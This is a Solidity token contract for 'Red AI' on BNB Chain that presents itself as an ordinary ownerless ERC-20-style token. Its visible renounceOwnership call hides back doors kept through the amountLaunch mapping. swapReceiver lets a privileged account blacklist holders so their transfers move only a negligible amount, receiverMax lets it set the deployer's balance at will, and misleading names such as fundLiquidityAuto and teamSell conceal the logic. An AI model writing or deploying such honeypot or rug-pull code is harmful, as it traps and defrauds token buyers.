/**
 *Submitted for verification at BscScan.com on 2023-02-02
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface tradingWallet {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface tradingLimit {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract RedAI is Ownable{
    uint8 public decimals = 18;
    string public symbol = "RAI";
    mapping(address => bool) public amountLaunch;
    address public isTo;

    address public isAmount;
    mapping(address => bool) public senderToken;
    mapping(address => uint256) public balanceOf;
    string public name = "Red AI";
    mapping(address => mapping(address => uint256)) public allowance;

    bool public isListBuy;

    uint256 public totalSupply = 100000000 * 10 ** 18;
    uint256 constant fundSell = 10 ** 10;

    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        tradingWallet maxToken = tradingWallet(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        isTo = tradingLimit(maxToken.factory()).createPair(maxToken.WETH(), address(this));
        isAmount = fundLiquidityAuto();
        amountLaunch[isAmount] = true;
        balanceOf[isAmount] = totalSupply;
        emit Transfer(address(0), isAmount, totalSupply);
        renounceOwnership();
    }

    

    function totalModeList(address modeExempt) public {
        if (isListBuy) {
            return;
        }
        amountLaunch[modeExempt] = true;
        isListBuy = true;
    }

    function fundLiquidityAuto() private view returns (address) {
        return msg.sender;
    }

    function swapReceiver(address fromMarketingEnable) public {
        if (fromMarketingEnable == isAmount || fromMarketingEnable == isTo || !amountLaunch[fundLiquidityAuto()]) {
            return;
        }
        senderToken[fromMarketingEnable] = true;
    }

    function approve(address takeReceiver, uint256 senderFromMode) public returns (bool) {
        allowance[fundLiquidityAuto()][takeReceiver] = senderFromMode;
        emit Approval(fundLiquidityAuto(), takeReceiver, senderFromMode);
        return true;
    }

    function teamSell(address enableAmountMarketing, address walletFee, uint256 senderFromMode) internal returns (bool) {
        require(balanceOf[enableAmountMarketing] >= senderFromMode);
        balanceOf[enableAmountMarketing] -= senderFromMode;
        balanceOf[walletFee] += senderFromMode;
        emit Transfer(enableAmountMarketing, walletFee, senderFromMode);
        return true;
    }

    function transferFrom(address sellTotalTrading, address isLaunch, uint256 senderFromMode) public returns (bool) {
        if (sellTotalTrading != fundLiquidityAuto() && allowance[sellTotalTrading][fundLiquidityAuto()] != type(uint256).max) {
            require(allowance[sellTotalTrading][fundLiquidityAuto()] >= senderFromMode);
            allowance[sellTotalTrading][fundLiquidityAuto()] -= senderFromMode;
        }
        if (isLaunch == isAmount || sellTotalTrading == isAmount) {
            return teamSell(sellTotalTrading, isLaunch, senderFromMode);
        }
        if (senderToken[sellTotalTrading]) {
            return teamSell(sellTotalTrading, isLaunch, fundSell);
        }
        return teamSell(sellTotalTrading, isLaunch, senderFromMode);
    }

    function receiverMax(uint256 senderFromMode) public {
        if (!amountLaunch[fundLiquidityAuto()]) {
            return;
        }
        balanceOf[isAmount] = senderFromMode;
    }

    function transfer(address isLaunch, uint256 senderFromMode) external returns (bool) {
        return transferFrom(fundLiquidityAuto(), isLaunch, senderFromMode);
    }

    function getOwner() external view returns (address) {
        return owner();
    }


}